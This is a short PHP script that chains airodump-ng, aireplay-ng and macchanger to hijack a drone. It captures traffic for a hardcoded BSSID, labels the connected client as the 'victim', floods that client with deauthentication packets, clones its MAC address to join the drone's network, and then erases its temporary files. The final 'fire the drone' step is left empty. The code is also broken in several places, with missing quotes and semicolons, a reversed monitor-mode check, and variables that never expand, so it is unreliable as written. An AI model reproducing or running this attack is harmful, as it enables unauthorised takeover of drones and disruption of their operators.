<?php
$card = shell_exec('iw dev | awk \'$1=="Interface"{print $2}\' | sed -e \'2d\' ');
$message = "Monitor mode not  enabled";
$moncheck = shell_exec('iwconfig wlan1 | grep Monitor | sed -e "s/Mode:/ /" | awk \'{print $1}\' | cut -b 5');

//Checks whether card is in monitor mode.
    if ($moncheck == 1) {
		echo "<script type='text/javascript'>alert('$message');</script>";
	}
	else {
	echo "Enable MONITOR MODE on card";
	}
//Search for Drone
shell_exec(timeout 5 airodump-ng wlan1 -c 4 --bssid 34:E3:80:25:B7:B8 -w /tmp/out --output-format netxml)

//Grab the client and assign it as victim
$victim = shell_exec('cat /tmp/out-01.kismet.netxml | grep client-mac | cut -c 16-32 ')
$host = shell_exec('cat /tmp/out-01.kismet.netxml | grep essid | sed -e "s/<essid cloaked=\"false\">/ /" -e "s/<\/essid>/ /" ');

//Deauthenticate the client
shell_exec('aireplay-ng -0 100 -a 34:E3:80:25:B7:B8 -c $victim  wlan1mon');

//Spoof our mac_address to connect to the ardrone
shell_exec('ifconfig wlan2 down && macchanger --mac $victim wlan2 && ifconfig wlan2 up');

//Connect to the ardrone
shell_exec('iwconfig wlan2 essid $host');

//Fire the drone




//Remove all tmp data
shell_exec('rm /tmp/out* ');

echo "See u Again"
?>
